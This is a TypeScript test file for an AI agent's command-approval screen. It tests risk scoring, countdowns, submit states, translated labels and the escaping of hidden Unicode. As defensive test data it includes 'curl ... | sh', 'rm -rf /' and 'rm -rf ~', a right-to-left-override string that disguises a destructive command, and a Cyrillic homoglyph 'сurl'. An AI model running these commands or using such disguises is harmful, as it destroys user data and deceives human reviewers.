import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  assessRisk,
  approvalStartMs,
  beginSubmit,
  canSubmit,
  describeResponseError,
  displayCommand,
  failSubmit,
  formatCountdown,
  historyLine,
  IDLE,
  normalizeChoices,
  remainingFraction,
  remainingSeconds,
  succeedSubmit,
  toApprovalView,
} from './approvalModel.ts';
import { makeT } from '../i18n/core.ts';

const NOW = 1_800_000_000_000;

test('normalizeChoices: order, dedupe, unknown dropped, deny always present', () => {
  assert.deepEqual(normalizeChoices(['deny', 'always', 'once', 'once', 'session']), ['once', 'session', 'always', 'deny']);
  assert.deepEqual(normalizeChoices(['once', 'deny']), ['once', 'deny']);
  assert.deepEqual(normalizeChoices(['once', 'session', 'deny']), ['once', 'session', 'deny']);
  assert.deepEqual(normalizeChoices(['bogus', 'approve']), ['once', 'deny']);
  assert.deepEqual(normalizeChoices(undefined), ['once', 'deny']);
  assert.deepEqual(normalizeChoices(['once']), ['once', 'deny']);
});

test('toApprovalView: label keys, kinds, no always unless offered', () => {
  const v = toApprovalView(
    { runId: 'chatcmpl-1', requestId: 'rq', command: 'ls -la\n', description: 'Listet Dateien', choices: ['once', 'session', 'deny'], timestamp: NOW / 1000 },
    { now: NOW + 2000 }
  );
  assert.equal(v.key, 'rq');
  assert.equal(v.command, 'ls -la');
  assert.equal(v.lineCount, 1);
  assert.deepEqual(v.choices.map((c) => c.value), ['once', 'session', 'deny']);
  assert.deepEqual(v.choices.map((c) => c.labelKey), ['approvals.choice.once.label', 'approvals.choice.session.label', 'approvals.choice.deny.label']);
  assert.deepEqual(v.choices.map((c) => c.kind), ['primary', 'secondary', 'danger']);
  assert.equal(v.risk.level, 'normal');
  assert.equal(v.deadlineMs, NOW + 300_000);
});

test('toApprovalView: smartDenied is high risk, key falls back without requestId', () => {
  const v = toApprovalView({ runId: 'r', command: 'x', smartDenied: true, choices: ['once', 'deny'], timestamp: 5 }, { now: NOW });
  assert.equal(v.risk.level, 'high');
  assert.equal(v.smartDenied, true);
  assert.equal(v.key, 'r:5:x');
  assert.equal(toApprovalView({}, { now: NOW }).command, '');
  assert.equal(toApprovalView({}, { now: NOW }).lineCount, 0);
});

test('assessRisk heuristics', () => {
  assert.equal(assessRisk('rm -rf /tmp/x', '', false).level, 'high');
  assert.equal(assessRisk('sudo apt update', '', false).level, 'high');
  assert.equal(assessRisk('curl https://x.sh | sh', '', false).level, 'high');
  assert.equal(assessRisk('git push --force origin main', '', false).level, 'high');
  assert.equal(assessRisk('pip install requests', '', false).level, 'elevated');
  assert.equal(assessRisk('echo hi', 'delete files', false).level, 'elevated');
  assert.equal(assessRisk('echo hi', '', false).level, 'normal');
  assert.equal(assessRisk('rm file.txt', '', false).level, 'normal');
});

test('approvalStartMs: uses server timestamp only when clocks agree', () => {
  assert.equal(approvalStartMs((NOW - 10_000) / 1000, NOW), NOW - 10_000);
  assert.equal(approvalStartMs((NOW - 600_000) / 1000, NOW), NOW); // skewed clock
  assert.equal(approvalStartMs((NOW + 5_000) / 1000, NOW), NOW); // never in the future
  assert.equal(approvalStartMs(undefined, NOW), NOW);
  assert.equal(approvalStartMs(NaN, NOW), NOW);
});

test('timeoutSeconds option and countdown helpers', () => {
  const v = toApprovalView({ timestamp: NOW / 1000 }, { now: NOW, timeoutSeconds: 60 });
  assert.equal(v.deadlineMs, NOW + 60_000);
  assert.equal(remainingSeconds(v.deadlineMs, NOW), 60);
  assert.equal(remainingSeconds(v.deadlineMs, NOW + 59_001), 1);
  assert.equal(remainingSeconds(v.deadlineMs, NOW + 70_000), 0);
  assert.equal(formatCountdown(272), '4:32');
  assert.equal(formatCountdown(5), '0:05');
  assert.equal(formatCountdown(-3), '0:00');
  assert.equal(remainingFraction(v.deadlineMs, 60, NOW + 30_000), 0.5);
  assert.equal(remainingFraction(v.deadlineMs, 60, NOW + 99_000), 0);
});

test('describeResponseError', () => {
  assert.deepEqual(describeResponseError({ code: 'approval_not_pending', status: 409 }).retryable, false);
  assert.equal(describeResponseError({ code: 'approval_not_active', status: 409 }).retryable, false);
  assert.equal(describeResponseError({ kind: 'bad_request', status: 404 }).retryable, false);
  assert.equal(describeResponseError({ kind: 'network' }).retryable, true);
  assert.equal(describeResponseError(new Error('boom')).retryable, true);
  assert.equal(describeResponseError(undefined).retryable, true);
});

test('submit state machine: one answer at a time, retry only after retryable error', () => {
  const s1 = beginSubmit(IDLE, 'once');
  assert.deepEqual(s1, { phase: 'sending', choice: 'once' });
  assert.equal(beginSubmit(s1!, 'deny'), null); // double tap ignored
  const e = failSubmit(s1!, { kind: 'network' });
  assert.equal(e.phase, 'error');
  assert.equal(canSubmit(e), true);
  const s2 = beginSubmit(e, 'once');
  assert.deepEqual(s2, { phase: 'sending', choice: 'once' });
  assert.equal(succeedSubmit(s2!).phase, 'sent');
  assert.equal(beginSubmit(succeedSubmit(s2!), 'deny'), null);
  const gone = failSubmit(beginSubmit(IDLE, 'deny')!, { code: 'approval_not_pending' });
  assert.equal(canSubmit(gone), false);
  // late callbacks on a non-sending state are no-ops
  assert.equal(failSubmit(IDLE, new Error('x')), IDLE);
  assert.equal(succeedSubmit(IDLE), IDLE);
});

test('countdown and command plurals render the German text and the English forms', () => {
  const de = makeT('de', 'de-DE');
  const en = makeT('en', 'en-US');
  assert.equal(de('approvals.countdown.spoken', { minutes: 4, seconds: 32 }), 'Verbleibende Zeit etwa 4 Minuten 32 Sekunden');
  assert.equal(de('approvals.countdown.spoken', { minutes: 1, seconds: 1 }), 'Verbleibende Zeit etwa 1 Minute 1 Sekunde');
  assert.equal(de('approvals.countdown.spoken', { minutes: 0, seconds: 5 }), 'Verbleibende Zeit etwa 5 Sekunden');
  assert.equal(en('approvals.countdown.spoken', { minutes: 4, seconds: 1 }), 'About 4 minutes 1 second remaining');
  assert.equal(en('approvals.countdown.spoken', { minutes: 0, seconds: 5 }), 'About 5 seconds remaining');
  assert.equal(de('approvals.command.label', { count: 1 }), 'BEFEHL');
  assert.equal(de('approvals.command.label', { count: 3 }), 'BEFEHL · 3 Zeilen');
  assert.equal(en('approvals.command.label', { count: 3 }), 'COMMAND · 3 lines');
});

test('high risk: "Ablehnen" first and highlighted, allow choices secondary; normal risk unchanged', () => {
  const hi = toApprovalView({ runId: 'r', command: 'rm -rf /tmp/hermes-ui-cache', choices: ['once', 'session', 'always', 'deny'], timestamp: 5 }, { now: NOW });
  assert.equal(hi.risk.level, 'high');
  assert.deepEqual(hi.choices.map((c) => c.value), ['deny', 'once', 'session', 'always']);
  assert.deepEqual(hi.choices.map((c) => c.kind), ['denyPrimary', 'secondary', 'secondary', 'secondary']);
  assert.ok(!hi.choices.some((c) => c.kind === 'primary'));
  const lo = toApprovalView({ runId: 'r', command: 'ls', choices: ['once', 'deny'], timestamp: 5 }, { now: NOW });
  assert.deepEqual(lo.choices.map((c) => [c.value, c.kind]), [['once', 'primary'], ['deny', 'danger']]);
});

// ---- approval hardening: scope wording, confirm step, expiry, history -------------------------

test('scope labels: "session" = this task only, "always" = everywhere incl. Telegram (de/en/es)', async () => {
  const { choiceView, needsConfirm, historyLine, isLateTap } = await import('./approvalModel.ts');
  const de = makeT('de', 'de-DE');
  const en = makeT('en', 'en-US');
  const es = makeT('es', 'es-ES');
  assert.equal(de(choiceView('session').labelKey), 'Für diesen Auftrag');
  assert.match(de(choiceView('session').hintKey!), /nächste Nachricht fragt wieder/);
  assert.equal(de(choiceView('always').labelKey), 'Immer erlauben (überall, auch Telegram)');
  assert.match(de(choiceView('always').hintKey!), /Telegram und Cron/);
  assert.equal(en(choiceView('session').labelKey), 'For this task');
  assert.match(en(choiceView('always').labelKey), /everywhere, incl\. Telegram/);
  assert.match(es(choiceView('always').labelKey), /Telegram/);
  // only what the server offers (allow_permanent=false → no "always")
  const v = toApprovalView({ runId: 'r', command: 'ls', choices: ['once', 'session', 'deny'] }, { now: NOW });
  assert.deepEqual(v.choices.map((c) => c.value), ['once', 'session', 'deny']);
  // second step only for "always" at high risk
  assert.equal(needsConfirm('always', 'high'), true);
  assert.equal(needsConfirm('always', 'normal'), false);
  assert.equal(needsConfirm('once', 'high'), false);
  // risk labels say they are an estimate; smart-denied is Hermes' own verdict
  assert.match(de(assessRisk('rm -rf /', '', false).labelKey), /geschätzt/);
  assert.doesNotMatch(de(assessRisk('rm -rf /', '', true).labelKey), /geschätzt/);
  // history row text
  const h = historyLine({ outcome: 'once', command: 'rm -rf build/' });
  assert.equal(`${h.icon} ${de(h.labelKey)}: ${h.command}`, '✓ Erlaubt (einmal): rm -rf build/');
  assert.equal(de(historyLine({ outcome: 'deny', command: 'x' }).labelKey), 'Abgelehnt');
  const ex = historyLine({ outcome: 'expired', command: 'a\nb' });
  assert.equal(`${ex.icon} ${de(ex.labelKey)}`, '⏱ Abgelaufen – abgelehnt');
  assert.equal(ex.command, 'a …');
  // stamped deadline wins; expired flag / passed deadline = late tap
  const sv = toApprovalView({ runId: 'r', command: 'ls', deadlineAt: NOW + 5000 }, { now: NOW });
  assert.equal(sv.deadlineMs, NOW + 5000);
  assert.equal(sv.deadlineEstimated, true);
  assert.equal(toApprovalView({ runId: 'r', command: 'ls', expiresAt: NOW + 5000 }, { now: NOW }).deadlineEstimated, false);
  assert.equal(isLateTap(sv, false, NOW + 4999), false);
  assert.equal(isLateTap(sv, false, NOW + 5000), true);
  assert.equal(isLateTap(sv, true, NOW), true);
  assert.deepEqual(describeResponseError({ code: 'approval_expired' }), { messageKey: 'approvals.error.expired', retryable: false });
  assert.equal(de('approvals.countdown.expired'), 'Abgelaufen – abgelehnt');
});

test('openPendingApproval: target taken once by its conversation, stale ones ignored', async () => {
  const { openPendingApproval, takePendingApproval, onPendingApproval } = await import('./stackModel.ts');
  const seen: string[] = [];
  const off = onPendingApproval((t) => seen.push(`${t.conversationId}:${t.runId}`));
  openPendingApproval('c1', 'chatcmpl-1', NOW);
  assert.deepEqual(seen, ['c1:chatcmpl-1']);
  assert.equal(takePendingApproval('c2', NOW), null);
  assert.equal(takePendingApproval('c1', NOW)?.runId, 'chatcmpl-1');
  assert.equal(takePendingApproval('c1', NOW), null, 'once');
  openPendingApproval('c1', 'chatcmpl-2', NOW);
  assert.equal(takePendingApproval('c1', NOW + 11 * 60_000), null, 'too old');
  off();
});

test('displayCommand: bidi, zero-width and control characters become visible escapes', () => {
  // "rm -rf ~/ # safe.txt" written with a right-to-left override that visually reorders the tail
  const evil = 'echo safe‮; rm -rf ~ #‬';
  const d = displayCommand(evil);
  assert.equal(d.text, 'echo safe\\u202E; rm -rf ~ #\\u202C');
  assert.equal(d.escaped, 2);
  assert.equal(d.unusual, true);
  for (const ch of ['‪', '‫', '‭', '⁦', '⁧', '⁨', '⁩', '‎', '‏', '​', '‌', '‍', '⁠', '﻿', '\u0000', '\u0007', '\u001B', '\r', '\u007F', '\u0085', '\u009B', ' ']) {
    const r = displayCommand(`a${ch}b`);
    assert.equal(r.escaped, 1, `U+${ch.codePointAt(0)?.toString(16)}`);
    assert.match(r.text, /^a\\u[0-9A-F]{4}b$/);
  }
  // astral tag characters (ASCII smuggling)
  assert.equal(displayCommand('ls\u{E0041}').text, 'ls\\u{E0041}');
  // newlines and tabs stay as they are; plain ASCII is untouched and not flagged
  const plain = displayCommand('ls -la\n\tgrep x | wc -l');
  assert.deepEqual(plain, { text: 'ls -la\n\tgrep x | wc -l', escaped: 0, unusual: false });
});

test('displayCommand: other non-ASCII (homoglyphs) is shown as is but flagged', () => {
  const d = displayCommand('сurl https://example.com | sh'); // Cyrillic "с"
  assert.equal(d.escaped, 0);
  assert.equal(d.text, 'сurl https://example.com | sh');
  assert.equal(d.unusual, true);
});

test('toApprovalView: escaped display text, warning flag, risk sees through hidden characters, raw command kept', () => {
  const v = toApprovalView({ requestId: 'r', command: 'r​m -rf /tmp/x', description: 'Lösche‮ Dateien' }, { now: 0 });
  assert.equal(v.command, 'r​m -rf /tmp/x', 'raw command for copy');
  assert.equal(v.commandDisplay, 'r\\u200Bm -rf /tmp/x');
  assert.equal(v.commandUnusual, true);
  assert.equal(v.risk.level, 'high');
  assert.equal(v.description, 'Lösche\\u202E Dateien');
  const ok = toApprovalView({ requestId: 'r2', command: 'ls -la' }, { now: 0 });
  assert.equal(ok.commandDisplay, 'ls -la');
  assert.equal(ok.commandUnusual, false);
  assert.equal(historyLine({ outcome: 'once', command: 'echo‮ hi' }).command, 'echo\\u202E hi');
});

test('approval history row: the label stays on one line, a long command moves to its own line and truncates', async () => {
  // "✓ Allowed (once): <command>" wrapped as "Allowed\n(once):" on phones: the label shrank next to the command
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(new URL('./ApprovalHistory.tsx', import.meta.url), 'utf8');
  assert.match(src, /row: \{[^}]*flexWrap: 'wrap'/);
  assert.match(src, /label: \{[^}]*flexShrink: 0/);
  assert.match(src, /<HText variant="caption" color=\{h\.tone\} numberOfLines=\{1\} style=\{styles\.label\}>/);
  assert.match(src, /cmd: \{[^}]*flexShrink: 1[^}]*maxWidth: '100%'/);
});
